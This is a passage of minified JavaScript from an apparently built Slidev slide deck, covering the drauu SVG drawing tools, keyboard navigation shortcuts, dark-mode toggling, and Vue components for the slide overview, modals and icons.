this.el||this.onStart(e),this.points[this.points.length-1]!==e&&(this.points.push(e),this.count+=1),this.count>5&&(this.points=Ua(this.points,1,!0),this.count=0),this.attr("d",Ya(this.points)),!0}onEnd(){const e=this.el;return this.el=null,!(!e||(e.setAttribute("d",Ya(Ua(this.points,1,!0))),!e.getTotalLength()))}};function hy(e,t){const s=t.x-e.x,o=t.y-e.y;return{length:Math.sqrt(Math.pow(s,2)+Math.pow(o,2)),angle:Math.atan2(o,s)}}function Wa(e,t,s,o){const r=t||e,l=s||e,i=.2,a=hy(r,l),c=a.angle+(o?Math.PI:0),u=a.length*i,d=e.x+Math.cos(c)*u,p=e.y+Math.sin(c)*u;return{x:d,y:p}}function gy(e,t,s){const o=Wa(s[t-1],s[t-2],e),r=Wa(e,s[t-1],s[t+1],!0);return`C ${o.x.toFixed(Xt)},${o.y.toFixed(Xt)} ${r.x.toFixed(Xt)},${r.y.toFixed(Xt)} ${e.x.toFixed(Xt)},${e.y.toFixed(Xt)}`}function Ya(e){return e.reduce((t,s,o,r)=>o===0?`M ${s.x.toFixed(Xt)},${s.y.toFixed(Xt)}`:`${t} ${gy(s,o,r)}`,"")}var yy=class extends ms{constructor(){super(...arguments),this.pathSubFactor=20,this.pathFragments=[]}onSelected(e){const t=(s,o)=>{if(s&&s.length)for(let r=0;r<s.length;r++){const l=s[r];if(l.getTotalLength){const i=l.getTotalLength();for(let a=0;a<this.pathSubFactor;a++){const c=l.getPointAtLength(i*a/this.pathSubFactor),u=l.getPointAtLength(i*(a+1)/this.pathSubFactor);this.pathFragments.push({x1:c.x,x2:u.x,y1:c.y,y2:u.y,segment:a,element:o||l})}}else l.children&&t(l.children,l)}};e&&t(e.children)}onUnselected(){this.pathFragments=[]}onStart(e){this.svgPointPrevious=this.svgElement.createSVGPoint(),this.svgPointPrevious.x=e.x,this.svgPointPrevious.y=e.y}onMove(e){this.svgPointCurrent=this.svgElement.createSVGPoint(),this.svgPointCurrent.x=e.x,this.svgPointCurrent.y=e.y;const t=this.checkAndEraseElement();return this.svgPointPrevious=this.svgPointCurrent,t}onEnd(){return this.svgPointPrevious=void 0,this.svgPointCurrent=void 0,!0}checkAndEraseElement(){const e=[];if(this.pathFragments.length)for(let t=0;t<this.pathFragments.length;t++){const s=this.pathFragments[t],o={x1:this.svgPointPrevious.x,x2:this.svgPointCurrent.x,y1:this.svgPointPrevious.y,y2:this.svgPointCurrent.y};this.lineLineIntersect(s,o)&&(s.element.remove(),e.push(t))}return e.length&&(this.pathFragments=this.pathFragments.filter((t,s)=>!e.includes(s))),e.length>0}lineLineIntersect(e,t){const s=e.x1,o=e.x2,r=t.x1,l=t.x2,i=e.y1,a=e.y2,c=t.y1,u=t.y2,d=(s-o)*(c-u)-(i-a)*(r-l),p=(s*a-i*o)*(r-l)-(s-o)*(r*u-c*l),f=(s*a-i*o)*(c-u)-(i-a)*(r*u-c*l),m=(h,x,b)=>h>=x&&h<=b?!0:h>=b&&h<=x;if(d===0)return!1;{const h={x:p/d,y:f/d};return m(h.x,s,o)&&m(h.y,i,a)&&m(h.x,r,l)&&m(h.y,c,u)}}};function vy(e){return{draw:new my(e),stylus:new ly(e),line:new ay(e),rectangle:new cy(e),ellipse:new iy(e),eraseLine:new yy(e)}}var _y=class{constructor(e={}){this.options=e,this.el=null,this.svgPoint=null,this.eventEl=null,this.shiftPressed=!1,this.altPressed=!1,this.drawing=!1,this._emitter=sy(),this._models=vy(this),this._undoStack=[],this._disposables=[],this.options.brush||(this.options.brush={color:"black",size:3,mode:"stylus"}),e.el&&this.mount(e.el,e.eventTarget)}get model(){return this._models[this.mode]}get mounted(){return!!this.el}get mode(){return this.options.brush.mode||"stylus"}set mode(e){this._models[this.mode].onUnselected(),this.options.brush.mode=e,this.model.onSelected(this.el)}get brush(){return this.options.brush}set brush(e){this.options.brush=e}resolveSelector(e){return typeof e=="string"?document.querySelector(e):e||null}mount(e,t){if(this.el)throw new Error("[drauu] already mounted, unmount previous target first");if(this.el=this.resolveSelector(e),!this.el)throw new Error("[drauu] target element not found");if(this.el.tagName.toLocaleLowerCase()!=="svg")throw new Error("[drauu] can only mount to a SVG element");if(!this.el.createSVGPoint)throw new Error("[drauu] SVG element must be create by document.createElementNS('http://www.w3.org/2000/svg', 'svg')");this.svgPoint=this.el.createSVGPoint();const s=this.resolveSelector(t)||this.el,o=this.eventStart.bind(this),r=this.eventMove.bind(this),l=this.eventEnd.bind(this),i=this.eventKeyboard.bind(this);s.addEventListener("pointerdown",o,{passive:!1}),window.addEventListener("pointermove",r,{passive:!1}),window.addEventListener("pointerup",l,{passive:!1}),window.addEventListener("pointercancel",l,{passive:!1}),window.addEventListener("keydown",i,!1),window.addEventListener("keyup",i,!1),this._disposables.push(()=>{s.removeEventListener("pointerdown",o),window.removeEventListener("pointermove",r),window.removeEventListener("pointerup",l),window.removeEventListener("pointercancel",l),window.removeEventListener("keydown",i,!1),window.removeEventListener("keyup",i,!1)}),this._emitter.emit("mounted")}unmount(){this._disposables.forEach(e=>e()),this._disposables.length=0,this.el=null,this._emitter.emit("unmounted")}on(e,t){return this._emitter.on(e,t)}undo(){const e=this.el;return e.lastElementChild?(this._undoStack.push(e.lastElementChild.cloneNode(!0)),e.lastElementChild.remove(),this._emitter.emit("changed"),!0):!1}redo(){return this._undoStack.length?(this.el.appendChild(this._undoStack.pop()),this._emitter.emit("changed"),!0):!1}canRedo(){return!!this._undoStack.length}canUndo(){var e;return!!((e=this.el)!=null&&e.lastElementChild)}eventMove(e){!this.acceptsInput(e)||!this.drawing||this.model._eventMove(e)&&(e.stopPropagation(),e.preventDefault(),this._emitter.emit("changed"))}eventStart(e){!this.acceptsInput(e)||(e.stopPropagation(),e.preventDefault(),this._currentNode&&this.cancel(),this.drawing=!0,this._emitter.emit("start"),this._currentNode=this.model._eventDown(e),this._currentNode&&this.mode!=="eraseLine"&&this.el.appendChild(this._currentNode),this._emitter.emit("changed"))}eventEnd(e){if(!this.acceptsInput(e)||!this.drawing)return;const t=this.model._eventUp(e);t?(t instanceof Element&&t!==this._currentNode&&(this._currentNode=t),this.commit()):this.cancel(),this.drawing=!1,this._emitter.emit("end"),this._emitter.emit("changed")}acceptsInput(e){return!this.options.acceptsInputTypes||this.options.acceptsInputTypes.includes(e.pointerType)}eventKeyboard(e){this.shiftPressed===e.shiftKey&&this.altPressed===e.altKey||(this.shiftPressed=e.shiftKey,this.altPressed=e.altKey,this.model.point&&this.model.onMove(this.model.point)&&this._emitter.emit("changed"))}commit(){this._undoStack.length=0;const e=this._currentNode;this._currentNode=void 0,this._emitter.emit("committed",e)}clear(){this._undoStack.length=0,this.cancel(),this.el.innerHTML="",this._emitter.emit("changed")}cancel(){this._currentNode&&(this.el.removeChild(this._currentNode),this._currentNode=void 0,this._emitter.emit("canceled"))}dump(){return this.el.innerHTML}load(e){this.clear(),this.el.innerHTML=e}};function by(e){return new _y(e)}const il=["#ff595e","#ffca3a","#8ac926","#1982c4","#6a4c93","#ffffff","#000000"],zt=Lt("slidev-drawing-enabled",!1),GE=Lt("slidev-drawing-pinned",!1),xy=z(!1),wy=z(!1),Ey=z(!1),Ks=z(!1),Bn=_h(Lt("slidev-drawing-brush",{color:il[0],size:4,mode:"stylus"})),Ka=z("stylus"),rd=D(()=>we.drawings.syncAll||jt.value);let Xs=!1;const ks=D({get(){return Ka.value},set(e){Ka.value=e,e==="arrow"?(Bn.mode="line",Bn.arrowEnd=!0):(Bn.mode=e,Bn.arrowEnd=!1)}}),Ay=Me({brush:Bn,acceptsInputTypes:D(()=>zt.value?void 0:["pen"]),coordinateTransform:!1}),it=Xo(by(Ay));function Sy(){it.clear(),rd.value&&Pu(Ye.value,"")}function ld(){var e;wy.value=it.canRedo(),xy.value=it.canUndo(),Ey.value=!!((e=it.el)!=null&&e.children.length)}function ky(e){Xs=!0;const t=Io[e||Ye.value];t!=null?it.load(t):it.clear(),Xs=!1}it.on("changed",()=>{if(ld(),!Xs){const e=it.dump(),t=Ye.value;(Io[t]||"")!==e&&rd.value&&Pu(t,it.dump())}});ah(e=>{Xs=!0,e[Ye.value]!=null&&it.load(e[Ye.value]||""),Xs=!1,ld()});et(()=>{me(Ye,()=>{!it.mounted||ky()},{immediate:!0})});it.on("start",()=>Ks.value=!0);it.on("end",()=>Ks.value=!1);window.addEventListener("keydown",e=>{if(!zt.value)return;const t=!e.ctrlKey&&!e.altKey&&!e.shiftKey&&!e.metaKey;let s=!0;e.code==="KeyZ"&&(e.ctrlKey||e.metaKey)?e.shiftKey?it.redo():it.undo():e.code==="Escape"?zt.value=!1:e.code==="KeyL"&&t?ks.value="line":e.code==="KeyA"&&t?ks.value="arrow":e.code==="KeyS"&&t?ks.value="stylus":e.code==="KeyR"&&t?ks.value="rectangle":e.code==="KeyE"&&t?ks.value="ellipse":e.code==="KeyC"&&t?Sy():e.code.startsWith("Digit")&&t&&+e.code[5]<=il.length?Bn.color=il[+e.code[5]-1]:s=!1,s&&(e.preventDefault(),e.stopPropagation())},!1);function Ue(...e){return D(()=>e.every(t=>lt(t)))}function mt(e){return D(()=>!lt(e))}const Xa=d0(),wr=Lt("slidev-color-schema","auto"),al=D(()=>we.colorSchema!=="auto"),Kl=D({get(){return al.value?we.colorSchema==="dark":wr.value==="auto"?Xa.value:wr.value==="dark"},set(e){al.value||(wr.value=e===Xa.value?"auto":e?"dark":"light")}}),id=Nu(Kl);Pt&&me(Kl,e=>{const t=document.querySelector("html");t.classList.toggle("dark",e),t.classList.toggle("light",!e)},{immediate:!0});const Eo=z(1),Ao=D(()=>We.length-1),_t=z(0),Xl=z(0);function Cy(){_t.value>Eo.value&&(_t.value-=1)}function $y(){_t.value<Ao.value&&(_t.value+=1)}function Dy(){if(_t.value>Eo.value){let e=_t.value-Xl.value;e<Eo.value&&(e=Eo.value),_t.value=e}}function By(){if(_t.value<Ao.value){let e=_t.value+Xl.value;e>Ao.value&&(e=Ao.value),_t.value=e}}function Fy(){const{escape:e,space:t,shift:s,left:o,right:r,up:l,down:i,enter:a,d:c,g:u,o:d}=Ju;let p=[{name:"next_space",key:Ue(t,mt(s)),fn:un,autoRepeat:!0},{name:"prev_space",key:Ue(t,s),fn:dn,autoRepeat:!0},{name:"next_right",key:Ue(r,mt(s),mt(rt)),fn:un,autoRepeat:!0},{name:"prev_left",key:Ue(o,mt(s),mt(rt)),fn:dn,autoRepeat:!0},{name:"next_page_key",key:"pageDown",fn:un,autoRepeat:!0},{name:"prev_page_key",key:"pageUp",fn:dn,autoRepeat:!0},{name:"next_down",key:Ue(i,mt(rt)),fn:Zs,autoRepeat:!0},{name:"prev_up",key:Ue(l,mt(rt)),fn:()=>Gs(!1),autoRepeat:!0},{name:"next_shift",key:Ue(r,s),fn:Zs,autoRepeat:!0},{name:"prev_shift",key:Ue(o,s),fn:()=>Gs(!1),autoRepeat:!0},{name:"toggle_dark",key:Ue(c,mt(zt)),fn:id},{name:"toggle_overview",key:Ue(d,mt(zt)),fn:td},{name:"hide_overview",key:Ue(e,mt(zt)),fn:()=>rt.value=!1},{name:"goto",key:Ue(u,mt(zt)),fn:()=>Xn.value=!Xn.value},{name:"next_overview",key:Ue(r,rt),fn:$y},{name:"prev_overview",key:Ue(o,rt),fn:Cy},{name:"up_overview",key:Ue(l,rt),fn:Dy},{name:"down_overview",key:Ue(i,rt),fn:By},{name:"goto_from_overview",key:Ue(a,rt),fn:()=>{cs(_t.value),rt.value=!1}}];const f=new Set(p.map(h=>h.name));if(p.filter(h=>h.name&&f.has(h.name)).length===0){const h=["========== WARNING ==========","defineShortcutsSetup did not return any of the base shortcuts.","See https://sli.dev/custom/config-shortcuts.html for migration.",'If it is intentional, return at least one shortcut with one of the base names (e.g. name:"goto").'].join(`

`);alert(h),console.warn(h)}return p}const ad=Ue(mt(Ug),mt(Wg),zg);function Oy(e,t,s=!1){typeof e=="string"&&(e=Ju[e]);const o=Ue(e,ad);let r=0,l;const i=()=>{if(clearTimeout(l),!o.value){r=0;return}s&&(l=setTimeout(i,Math.max(1e3-r*250,150)),r++),t()};return me(o,i,{flush:"sync"})}function Iy(e,t){return Kh(e,s=>{!ad.value||s.repeat||t()})}function Ty(){const e=Fy();new Map(e.map(s=>[s.key,s])).forEach(s=>{s.fn&&Oy(s.key,s.fn,s.autoRepeat)}),Iy("f",()=>ed.toggle())}const Py={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 32 32",width:"1.2em",height:"1.2em"},My=n("path",{fill:"currentColor",d:"M24 9.4L22.6 8L16 14.6L9.4 8L8 9.4l6.6 6.6L8 22.6L9.4 24l6.6-6.6l6.6 6.6l1.4-1.4l-6.6-6.6L24 9.4z"},null,-1),Ly=[My];function Ry(e,t){return _(),$("svg",Py,Ly)}const Ny={name:"carbon-close",render:Ry};function Ql(e){var s,o;const t=(o=(s=e==null?void 0:e.meta)==null?void 0:s.slide)==null?void 0:o.no;return t!=null?`slidev-page-${t}`:""}const cd=Ae({__name:"SlideContainer",props:{width:{type:Number},meta:{default:()=>({})},scale:{type:[Number,String]}},setup(e){const t=e;N(U);const s=z(),o=A0(s),r=D(()=>t.width?t.width:o.width.value),l=D(()=>t.width?t.width/cn:o.height.value);t.width&&to(()=>{s.value&&(s.value.style.width=`${r.value}px`,s.value.style.height=`${l.value}px`)});const i=D(()=>r.value/l.value),a=D(()=>t.scale?t.scale:i.value<cn?r.value/Tn:l.value*cn/Tn),c=D(()=>({height:`${Ou}px`,width:`${Tn}px`,transform:`translate(-50%, -50%) scale(${a.value})`})),u=D(()=>({"select-none":!we.selectable,"slidev-code-line-numbers":we.lineNumbers}));return yt(Fu,a),(d,p)=>(_(),$("div",{id:"slide-container",ref_key:"root",ref:s,class:Pe(w(u))},[n("div",{id:"slide-content",style:Ze(w(c))},[Ut(d.$slots,"default")],4),Ut(d.$slots,"controls")],2))}});const Zl=Ae({props:{clicks:{type:[Number,String],default:0},clicksElements:{type:Array,default:()=>[]},clicksOrderMap:{type:Map,default:()=>new Map},clicksDisabled:{type:Boolean,default:!1},context:{type:String,default:"main"},is:{type:Object,default:void 0},route:{type:Object,default:void 0}},setup(e,{emit:t}){const s=Ht(e,"clicks",t),o=Ht(e,"clicksElements",t),r=Ht(e,"clicksDisabled",t),l=Ht(e,"clicksOrderMap",t);o.value.length=0,yt(Xm,e.route),yt(Qm,e.context),yt(Fs,s),yt(Os,r),yt(kn,o),yt(Xr,l)},render(){var e,t;return this.$props.is?vt(this.$props.is):(t=(e=this.$slots)==null?void 0:e.default)==null?void 0:t.call(e)}}),qy=["innerHTML"],jy=Ae({__name:"DrawingPreview",props:{page:null},setup(e){return N(U),(t,s)=>w(Io)[e.page]?(_(),$("svg",{key:0,ref:"svg",class:"w-full h-full absolute top-0 pointer-events-none",innerHTML:w(Io)[e.page]},null,8,qy)):he("v-if",!0)}}),Hy={class:"slides-overview bg-main !bg-opacity-75 p-16 overflow-y-auto"},zy=["onClick"],Vy=Ae({__name:"SlidesOverview",props:{modelValue:{type:Boolean}},emits:[],setup(e,{emit:t}){const s=e;N(U);const o=Ht(s,"modelValue",t);function r(){o.value=!1}function l(m){cs(m),r()}function i(m){return m===_t.value}const a=ol.smaller("xs"),c=ol.smaller("sm"),u=4*16*2,d=2*16,p=D(()=>a.value?Mn.width.value-u:c.value?(Mn.width.value-u-d)/2:300),f=D(()=>Math.floor((Mn.width.value-u)/(p.value+d)));return to(()=>{_t.value=Ye.value,Xl.value=f.value}),(m,h)=>{const x=Ny;return _(),$(Se,null,[W(n("div",Hy,[n("div",{class:"grid gap-y-4 gap-x-8 w-full",style:Ze(`grid-template-columns: repeat(auto-fit,minmax(${w(p)}px,1fr))`)},[(_(!0),$(Se,null,no(w(We).slice(0,-1),(b,k)=>(_(),$("div",{key:b.path,class:"relative"},[n("div",{class:Pe(["inline-block border border-gray-400 rounded border-opacity-50 overflow-hidden bg-main hover:border-$slidev-theme-primary",{"border-$slidev-theme-primary":i(k+1)}]),onClick:S=>l(+b.path)},[(_(),Y(cd,{key:b.path,width:w(p),"clicks-disabled":!0,class:"pointer-events-none"},{default:X(()=>[C(w(Zl),{is:b==null?void 0:b.component,"clicks-disabled":!0,class:Pe(w(Ql)(b)),route:b,context:"overview"},null,8,["is","class","route"]),C(jy,{page:+b.path},null,8,["page"])]),_:2},1032,["width"]))],10,zy),n("div",{class:"absolute top-0 opacity-50",style:Ze(`left: ${w(p)+5}px`)},pn(k+1),5)]))),128))],4)],512),[[$u,w(o)]]),w(o)?(_(),$("button",{key:0,class:"fixed text-2xl top-4 right-4 icon-btn text-gray-400",onClick:r},[C(x)])):he("v-if",!0)],64)}}});const Uy="/crescer/dia-2/assets/logo.b72bde5d.png",Wy={key:0,class:"fixed top-0 bottom-0 left-0 right-0 grid z-20"},Yy=Ae({__name:"Modal",props:{modelValue:{default:!1},class:{default:""}},emits:["modelValue"],setup(e,{emit:t}){const s=e;N(U);const o=Ht(s,"modelValue",t);function r(){o.value=!1}return(l,i)=>(_(),Y(cu,null,[w(o)?(_(),$("div",Wy,[n("div",{bg:"black opacity-80",class:"absolute top-0 bottom-0 left-0 right-0 -z-1",onClick:i[0]||(i[0]=a=>r())}),n("div",{class:Pe(["m-auto rounded-md bg-main shadow",s.class]),"dark:border":"~ gray-400 opacity-10"},[Ut(l.$slots,"default")],2)])):he("v-if",!0)],1024))}}),Ky={class:"slidev-info-dialog slidev-layout flex flex-col gap-4 text-base"},Xy=["innerHTML"],Qy=n("a",{href:"https://github.com/slidevjs/slidev",target:"_blank",class:"!opacity-100 !border-none !text-current"},[n("div",{class:"flex gap-1 children:my-auto"},[n("div",{class:"opacity-50 text-sm mr-2"},"Powered by"),n("img",{class:"w-5 h-5",src:Uy,alt:"Slidev"}),n("div",{style:{color:"#2082A6"}},[n("b",null,"Sli"),y("dev ")])])],-1),Zy=Ae({__name:"InfoDialog",props:{modelValue:{default:!1}},emits:["modelValue"],setup(e,{emit:t}){const s=e;N(U);const o=Ht(s,"modelValue",t),r=D(()=>typeof we.info=="string");return(l,i)=>(_(),Y(Yy,{modelValue:w(o),"onUpdate:modelValue":i[0]||(i[0]=a=>ke(o)?o.value=a:null),class:"px-6 py-4"},{default:X(()=>[n("div",Ky,[w(r)?(_(),$("div",{key:0,class:"mb-4",innerHTML:w(we).info},null,8,Xy)):he("v-if",!0),Qy])]),_:1},8,["modelValue"]))}});const Gy=["disabled","onKeydown"],Jy=Ae({__name:"Goto",setup(e){N(U);const t=z(),s=z(""),o=D(()=>{if(s.value.startsWith("/"))return!!We.find(i=>i.path===s.value.substring(1));{const i=+s.value;return!isNaN(i)&&i>0&&i<=bd.value}});function r(){o.value&&(s.value.startsWith("/")?cs(s.value.substring(1)):cs(+s.value)),l()}function l(){Xn.value=!1}return me(Xn,async i=>{var a,c;i?(await et(),s.value="",(a=t.value)==null||a.focus()):(c=t.value)==null||c.blur()}),me(s,i=>{i.match(/^[^0-9/]/)&&(s.value=s.value.substring(1))}),(i,a)=>(_(),$("div",{id:"slidev-goto-dialog",class:Pe(["fixed right-5 bg-main transform transition-all",w(Xn)?"top-5":"-top-20"]),shadow:"~",p:"x-4 y-2",border:"~ transparent rounded dark:gray-400 dark:opacity-25"},[W(n("input",{ref_key:"input",ref:t,"onUpdate:modelValue":a[0]||(a[0]=c=>s.value=c),type:"text",disabled:!w(Xn),class:Pe(["outline-none bg-transparent",{"text-red-400":!w(o)&&s.value}]),placeholder:"Goto...",onKeydown:[Qi(r,["enter"]),Qi(l,["escape"])],onBlur:l},null,42,Gy),[[Kr,s.value]])],2))}}),ev=Ae({__name:"Controls",setup(e){N(U);const t=Tt(),s=Tt();return(o,r)=>(_(),$(Se,null,[C(Vy,{modelValue:w(rt),"onUpdate:modelValue":r[0]||(r[0]=l=>ke(rt)?rt.value=l:null)},null,8,["modelValue"]),C(Jy),w(t)?(_(),Y(w(t),{key:0})):he("v-if",!0),w(s)?(_(),Y(w(s),{key:1,modelValue:w(br),"onUpdate:modelValue":r[1]||(r[1]=l=>ke(br)?br.value=l:null)},null,8,["modelValue"])):he("v-if",!0),w(we).info?(_(),Y(Zy,{key:2,modelValue:w(Ps),"onUpdate:modelValue":r[2]||(r[2]=l=>ke(Ps)?Ps.value=l:null)},null,8,["modelValue"])):he("v-if",!0)],64))}}),tv={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 32 32",width:"1.2em",height:"1.2em"},nv=n("path",{fill:"currentColor",d:"M30 8h-4.1c-.5-2.3-2.5-4-4.9-4s-4.4 1.7-4.9 4H2v2h14.1c.5 2.3 2.5 4 4.9 4s4.4-1.7 4.9-4H30V8zm-9 4c-1.7 0-3-1.3-3-3s1.3-3 3-3s3 1.3 3 3s-1.3 3-3 3zM2 24h4.1c.5 2.3 2.5 4 4.9 4s4.4-1.7 4.9-4H30v-2H15.9c-.5-2.3-2.5-4-4.9-4s-4.4 1.7-4.9 4H2v2zm9-4c1.7 0 3 1.3 3 3s-1.3 3-3 3s-3-1.3-3-3s1.3-3 3-3z"},null,-1),sv=[nv];function ov(e,t){return _(),$("svg",tv,sv)}const rv={name:"carbon-settings-adjust",render:ov},lv={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 32 32",width:"1.2em",height:"1.2em"},iv=n("path",{fill:"currentColor",d:"M17 22v-8h-4v2h2v6h-3v2h8v-2h-3zM16 8a1.5 1.5 0 1 0 1.5 1.5A1.5 1.5 0 0 0 16 8z"},null,-1),av=n("path",{fill:"currentColor",d:"M16 30a14 14 0 1 1 14-14a14 14 0 0 1-14 14Zm0-26a12 12 0 1 0 12 12A12 12 0 0 0 16 4Z"},null,-1),cv=[iv,av];function uv(e,t){return _(),$("svg",lv,cv)}const dv={name:"carbon-information",render:uv},pv={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 32 32",width:"1.2em",height:"1.2em"},fv=n("path",{fill:"currentColor",d:"M26 24v4H6v-4H4v4a2 2 0 0 0 2 2h20a2 2 0 0 0 2-2v-4zm0-10l-1.41-1.41L17 20.17V2h-2v18.17l-7.59-7.58L6 14l10 10l10-10z"},null,-1),mv=[fv];function hv(e,t){return _(),$("svg",pv,mv)}const gv={name:"carbon-download",render:hv},yv={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 32 32",width:"1.2em",height:"1.2em"},vv=n("path",{fill:"currentColor",d:"M29.415 19L27.7 17.285A2.97 2.97 0 0 0 28 16a3 3 0 1 0-3 3a2.97 2.97 0 0 0 1.286-.3L28 20.414V28h-6v-3a7.008 7.008 0 0 0-7-7H9a7.008 7.008 0 0 0-7 7v5h28v-9.586A1.988 1.988 0 0 0 29.415 19ZM4 25a5.006 5.006 0 0 1 5-5h6a5.006 5.006 0 0 1 5 5v3H4Z"},null,-1),_v=n("path",{fill:"currentColor",d:"M12 4a5 5 0 1 1-5 5a5 5 0 0 1 5-5m0-2a7 7 0 1 0 7 7a7 7 0 0 0-7-7Z"},null,-1),bv=[vv,_v];function xv(e,t){return _(),$("svg",yv,bv)}const wv={name:"carbon-user-speaker",render:xv},Ev={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 32 32",width:"1.2em",height:"1.2em"},Av=n("path",{fill:"currentColor",d:"M15 10h2v8h-2zm5 4h2v4h-2zm-10-2h2v6h-2z"},null,-1),Sv=n("path",{fill:"currentColor",d:"M25 4h-8V2h-2v2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h8v6h-4v2h10v-2h-4v-6h8a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2Zm0 16H7V6h18Z"},null,-1),kv=[Av,Sv];function Cv(e,t){return _(),$("svg",Ev,kv)}const $v={name:"carbon-presentation-file",render:Cv},Dv={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 32 32",width:"1.2em",height:"1.2em"},Bv=n("path",{fill:"currentColor",d:"M27.307 6.107L30 3.414L28.586 2l-2.693 2.693L24.8 3.6a1.933 1.933 0 0 0-2.8 0l-18 18V28h6.4l18-18a1.933 1.933 0 0 0 0-2.8ZM9.6 26H6v-3.6L23.4 5L27 8.6ZM9 11.586L16.586 4L18 5.414L10.414 13z"},null,-1),Fv=[Bv];function Ov(e,t){return _(),$("svg",Dv,Fv)}const Iv={name:"carbon-pen",render:Ov},Tv={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 256 256",width:"1.2em",height:"1.2em"},Pv=n("path",{fill:"currentColor",d:"m38.2 48.5l58.2 155.2a8 8 0 0 0 15-.1l23.3-64.1a8.1 8.1 0 0 1 4.8-4.8l64.1-23.3a8 8 0 0 0 .1-15L48.5 38.2a8 8 0 0 0-10.3 10.3Z",opacity:".2"},null,-1),Mv=n("path",{fill:"currentColor",d:"m150.5 139.2l55.9-20.3a16 16 0 0 0 .1-30L51.3 30.7a16 16 0 0 0-20.6 20.6l58.2 155.2a15.9 15.9 0 0 0 15 10.4h.1a15.9 15.9 0 0 0 14.9-10.5l20.3-55.9l63.1 63.2a8.5 8.5 0 0 0 5.7 2.3a8.3 8.3 0 0 0 5.7-2.3a8.1 8.1 0 0 0 0-11.4Zm-46.6 61.7L45.7 45.7l155.2 58.2l-64.1 23.3a15.7 15.7 0 0 0-9.6 9.6Z"},null,-1),Lv=[Pv,Mv];function Rv(e,t){return _(),$("svg",Tv,Lv)}const Nv={name:"ph-cursor-duotone",render:Rv},qv={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 256 256",width:"1.2em",height:"1.2em"},jv=n("path",{fill:"currentColor",d:"M213.7 202.3a8.1 8.1 0 0 1 0 11.4a8.3 8.3 0 0 1-5.7 2.3a8.5 8.5 0 0 1-5.7-2.3l-63.1-63.2l-20.3 55.9a15.9 15.9 0 0 1-14.9 10.5h-.1a15.9 15.9 0 0 1-15-10.4L30.7 51.3a16 16 0 0 1 20.6-20.6l155.2 58.2a16 16 0 0 1-.1 30l-55.9 20.3Z"},null,-1),Hv=[jv];function zv(e,t){return _(),$("svg",qv,Hv)}const ud={name:"ph-cursor-fill",render:zv},Vv={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 32 32",width:"1.2em",height:"1.2em"},Uv=n("path",{fill:"currentColor",d:"M16 12.005a4 4 0 1 1-4 4a4.005 4.005 0 0 1 4-4m0-2a6 6 0 1 0 6 6a6 6 0 0 0-6-6ZM5.394 6.813L6.81 5.399l3.505 3.506L8.9 10.319zM2 15.005h5v2H2zm3.394 10.193L8.9 21.692l1.414 1.414l-3.505 3.506zM15 25.005h2v5h-2zm6.687-1.9l1.414-1.414l3.506 3.506l-1.414 1.414zm3.313-8.1h5v2h-5zm-3.313-6.101l3.506-3.506l1.414 1.414l-3.506 3.506zM15 2.005h2v5h-2z"},null,-1),Wv=[Uv];function Yv(e,t){return _(),$("svg",Vv,Wv)}const Kv={name:"carbon-sun",render:Yv},Xv={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 32 32",width:"1.2em",height:"1.2em"},Qv=n("path",{fill:"currentColor",d:"M13.502 5.414a15.075 15.075 0 0 0 11.594 18.194a11.113 11.113 0 0 1-7.975 3.39c-.138 0-.278.005-.418 0a11.094 11.094 0 0 1-3.2-21.584M14.98 3a1.002 1.002 0 0 0-.175.016a13.096 13.096 0 0 0 1.825 25.981c.164.006.328 0 .49 0a13.072 13.072 0 0 0 10.703-5.555a1.01 1.01 0 0 0-.783-1.565A13.08 13.08 0 0 1 15.89 4.38A1.015 1.015 0 0 0 14.98 3Z"},null,-1),Zv=[Qv];function Gv(e,t){return _(),$("svg",Xv,Zv)}const Jv={name:"carbon-moon",render:Gv},e1={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 32 32",width:"1.2em",height:"1.2em"},t1=n("path",{fill:"currentColor",d:"M8 4v4H4V4Zm2-2H2v8h8Zm8 2v4h-4V4Zm2-2h-8v8h8Zm8 2v4h-4V4Zm2-2h-8v8h8ZM8 14v4H4v-4Zm2-2H2v8h8Zm8 2v4h-4v-4Zm2-2h-8v8h8Zm8 2v4h-4v-4Zm2-2h-8v8h8ZM8 24v4H4v-4Zm2-2H2v8h8Zm8 2v4h-4v-4Zm2-2h-8v8h8Zm8 2v4h-4v-4Zm2-2h-8v8h8Z"},null,-1),n1=[t1];function s1(e,t){return _(),$("svg",e1,n1)}const o1={name:"carbon-apps",render:s1},r1={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 32 32",width:"1.2em",height:"1.2em"},l1=n("path",{fill:"currentColor",d:"m18 6l-1.43 1.393L24.15 15H4v2h20.15l-7.58 7.573L18 26l10-10L18 6z"},null,-1),i1=[l1];function a1(e,t){return _(),$("svg",r1,i1)}const c1={name:"carbon-arrow-right",render:a1},u1={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 32 32",width:"1.2em",height:"1.2em"},d1=n("path",{fill:"currentColor",d:"m14 26l1.41-1.41L7.83 17H28v-2H7.83l7.58-7.59L14 6L4 16l10 10z"},null,-1),p1=[d1];function f1(e,t){return _(),$("svg",u1,p1)}const m1={name:"carbon-arrow-left",render:f1},h1={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 32 32",width:"1.2em",height:"1.2em"},g1=n("path",{fill:"currentColor",d:"M20 2v2h6.586L18 12.582L19.414 14L28 5.414V12h2V2H20zm-6 17.416L12.592 18L4 26.586V20H2v10h10v-2H5.414L14 19.416z"},null,-1),y1=[g1];function v1(e,t){return _(),$("svg",h1,y1)}const _1={name:"carbon-maximize",render:v1},b1={class:"slidev-icon",preserveAspectRatio:"xMidYMid meet",viewBox:"0 0 